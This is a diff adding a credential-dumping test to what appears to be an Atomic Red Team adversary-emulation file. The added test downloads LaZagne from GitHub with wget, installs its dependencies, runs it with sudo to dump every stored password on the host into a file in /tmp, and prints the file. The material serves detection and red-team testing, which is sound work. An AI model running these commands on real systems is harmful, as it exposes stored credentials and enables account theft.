@@ -203,3 +203,53 @@ atomic_tests:
       rm -f #{output_file} > /dev/null
     name: bash
     elevation_required: true
+- name: Capture Passwords with LaZagne (Linux)
+  description: |
+    LaZagne project is a application used to retrieve passwords stored on a local computer. This application has been added to pupy post-exploitation framework. 
+    Use this test to retrieve all passwords from the memory of the compromised system and output them to a specified file. 
+    See https://github.com/AlessandroZ/LaZagne.
+  supported_platforms:
+  - linux
+  input_arguments:
+    output_file:
+      description: Path where captured results will be placed
+      type: path
+      default: /tmp/T1003.007Test5.txt
+    LaZagne_Location:
+      description: Path of LaZagne application
+      type: path
+      default: /tmp/lazagne/LaZagne-2.4.5/Linux/laZagne.py
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      LaZagne script must exist on disk at specified location (#{LaZagne_Location})
+    prereq_command: |
+      if [ -d "#{LaZagne_Location}" ]; then exit 0; else exit 1; fi;
+    get_prereq_command: |
+      wget -O "/tmp/lazagne_v2_4_5.tar.gz" https://github.com/AlessandroZ/LaZagne/archive/refs/tags/v2.4.5.tar.gz
+      mkdir /tmp/lazagne
+      tar -xzvf "/tmp/lazagne_v2_4_5.tar.gz" -C /tmp/lazagne
+  - description: |
+      Python must be installed
+    prereq_command: |
+      if [ -x "$(command -v python3 --version)" ]; then exit 0; else exit 1; fi;
+    get_prereq_command: |
+      sudo apt install python3
+  - description: |
+      Python3-pip must be installed
+    prereq_command: |
+      if [ -x "$(command -v python3-pip --version)" ]; then exit 0; else exit 1; fi;
+    get_prereq_command: |
+      sudo apt-get -y install python3-pip
+  - description: |
+      Install the dependencies for Lazagne
+    get_prereq_command: |
+      pip install -r /tmp/lazagne/LaZagne-2.4.5/requirements.txt
+  executor:
+    command: |
+      sudo python3 #{LaZagne_Location} all > #{output_file}
+      cat #{output_file}
+    cleanup_command: |
+      rm -f #{output_file} > /dev/null
+    name: bash
+    elevation_required: true
